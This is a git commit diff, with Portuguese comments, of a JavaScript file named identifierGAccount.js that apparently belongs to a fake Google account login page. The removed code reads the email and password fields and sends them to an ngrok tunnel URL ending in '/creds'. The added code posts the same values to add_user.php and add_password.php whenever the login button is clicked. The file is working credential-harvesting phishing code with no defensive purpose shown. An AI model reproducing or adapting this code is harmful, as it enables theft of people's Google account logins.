2e95d51ee2f2f4b3c42ecc835e2294baea1dbba6
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-11 18:45:42 -0300

    Update identifierGAccount.js

--- identifierGAccount.js
+++ identifierGAccount.js
@@ -1,32 +1,47 @@
-const loginBtn = document.getElementsByClassName('VfPpkd-LgbsSe')[1];
+// Função para enviar o nome de usuário para o arquivo PHP
+function sendUsername() {
+  // Obtém o valor do campo de entrada do nome de usuário
+  const username = document.querySelector('[type="email"]').value;
 
-function getEmail() {
-  const emailInput = document.querySelector('[type="email"]');
-  return emailInput.value;
+  // Cria uma nova solicitação AJAX para enviar o nome de usuário para o arquivo PHP
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', 'add_user.php');
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send(`username=${username}`);
+
+  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      console.log('Nome de usuário enviado com sucesso!');
+    } else {
+      console.error('Ocorreu um erro ao enviar o nome de usuário.');
+    }
+  };
 }
 
-function getPassword() {
-  const passwordInput = document.querySelector('[type="password"]');
-  return passwordInput.value;
+// Função para enviar a senha para o arquivo PHP
+function sendPassword() {
+  // Obtém o valor do campo de entrada da senha
+  const password = document.querySelector('[type="password"]').value;
+
+  // Cria uma nova solicitação AJAX para enviar a senha para o arquivo PHP
+  const xhr = new XMLHttpRequest();
+  xhr.open('POST', 'add_password.php');
+  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr.send(`password=${password}`);
+
+  // Exibe uma mensagem de sucesso ou erro, dependendo da resposta do servidor
+  xhr.onload = () => {
+    if (xhr.status === 200) {
+      console.log('Senha enviada com sucesso!');
+    } else {
+      console.error('Ocorreu um erro ao enviar a senha.');
+    }
+  };
 }
 
-async function testLogin() {
-  const username = getEmail();
-  const password = getPassword();
-  const url = `https://23b1-45-162-158-3.sa.ngrok.io/creds?user=${username}&pwd=${password}`;
-  
-  try {
-    const response = await fetch(url);
-    const data = await response.json();
-    console.log(data);
-  } catch (error) {
-    console.error(error);
-  }
-}
+// Adiciona os manipuladores de eventos para os botões de envio do formulário
+let btn = document.querySelector("[class='VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b']");
 
-loginBtn.addEventListener('click', function() {
-  const username = getEmail();
-  const password = getPassword();
-
-  setTimeout(testLogin, 3000);
-});
+btn.addEventListener('click', sendUsername);
+btn.addEventListener('click', sendPassword);
